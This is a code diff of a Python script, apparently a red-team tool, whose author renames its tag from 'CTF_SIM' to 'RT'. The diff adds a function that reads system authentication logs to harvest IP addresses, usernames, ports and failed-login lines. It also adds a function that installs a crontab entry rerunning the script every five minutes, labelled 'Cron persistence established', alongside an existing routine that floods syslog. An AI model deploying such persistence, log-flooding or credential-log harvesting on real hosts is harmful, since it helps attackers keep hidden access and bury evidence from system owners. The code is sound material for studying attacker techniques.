@@ -1,12 +1,17 @@
 #!/usr/bin/env python3
 # Seonho Park, scp4941@rit.edu
 
+import re
 import os
 import time
 import argparse
 import logging
+import hashlib
 from logging.handlers import SysLogHandler
-from datetime import datetime
+from datetime import datetime, timezone
+
+import subprocess
+import sys
 
 # Configurations
 MAX_RATE = 50          # max messages/sec (DOS safeguard)
@@ -16,8 +21,63 @@ DEFAULT_LOGS = [
     "/var/log/auth.log",
     "/var/log/messages"
 ]
+TAG = "RT"
 
-CTF_TAG = "CTF_SIM"
+# ---------------------------------------------------------------------------
+# Pattern-based log analysis / info extraction
+# ---------------------------------------------------------------------------
+
+# Pre-compiled patterns — compile once, reuse for every line.
+_IP_RE   = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+_USER_RE = re.compile(r"user(?:name)?[=:\s]+([a-zA-Z0-9_@.-]+)", re.IGNORECASE)
+_FAIL_RE = re.compile(
+    r"(failed|failure|invalid|unauthorized|denied|error|refused|rejected)",
+    re.IGNORECASE,
+)
+_PORT_RE = re.compile(r"\bport\s+(\d{1,5})\b", re.IGNORECASE)
+
+
+#   Scan log files and return structured findings.
+def extract_info(log_paths: list[str], keywords: list[str],) -> list[dict]:
+
+    findings: list[dict] = []
+
+    for path in log_paths:
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "r", errors="ignore") as fh:
+                for raw_line in fh:
+                    line = raw_line.strip()
+                    if not line:
+                        continue
+
+                    matched_kw  = [kw for kw in keywords if kw.lower() in line.lower()]
+                    ips         = _IP_RE.findall(line)
+                    users       = _USER_RE.findall(line)
+                    ports       = _PORT_RE.findall(line)
+                    flags: list[str] = []
+
+                    if _FAIL_RE.search(line):
+                        flags.append("auth_failure_or_error")
+
+                    # Only record lines that matched something of interest.
+                    if matched_kw or ips or users or flags:
+                        findings.append({
+                            "source":    path,                                      # log file path
+                            "line":      line,                                      # original log line
+                            "timestamp": datetime.now(timezone.utc).isoformat(),    # time the line was processed
+                            "ips":       ips,                                       # list of IP addresses found in the line
+                            "users":     users,                                     # list of users found in the line
+                            "ports":     ports,                                     # list of port numbers found in the line
+                            "keywords":  matched_kw,                                # list of keywords to matched
+                            "flags":     flags,                                     # list of detected flags
+                            "hash":      hashlib.sha256(line.encode()).hexdigest(), # hash of the line
+                        })
+        except PermissionError:
+            continue
+
+    return findings
 
 # Checks if user is privileged
 def is_privileged():
@@ -43,7 +103,7 @@ def setup_syslog():
     logger.setLevel(logging.INFO)
 
     handler = SysLogHandler(address="/dev/log")
-    formatter = logging.Formatter(f"{CTF_TAG}: %(message)s")
+    formatter = logging.Formatter(f"{TAG}: %(message)s")
     handler.setFormatter(formatter)
     logger.addHandler(handler)
 
@@ -74,6 +134,27 @@ def flood_logs(rate, duration):
         time.sleep(interval)
 
     print(f"[+] Flood complete ({counter} entries written)")
+
+def create_cron_persistence(script_path):
+    cron_job = f"*/5 * * * * /usr/bin/python3 {script_path}\n"
+    
+    try:
+        # Get current crontab
+        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+        current_cron = result.stdout if result.returncode == 0 else ""
+        
+        # Append new job
+        new_cron = current_cron + cron_job
+        
+        # Write back
+        process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+        process.communicate(input=new_cron)
+        
+        print("[+] Cron persistence established (every 5 minutes)")
+        return True
+    except Exception as e:
+        print(f"[-] Cron setup failed: {e}")
+        return False
 
 
 def main():
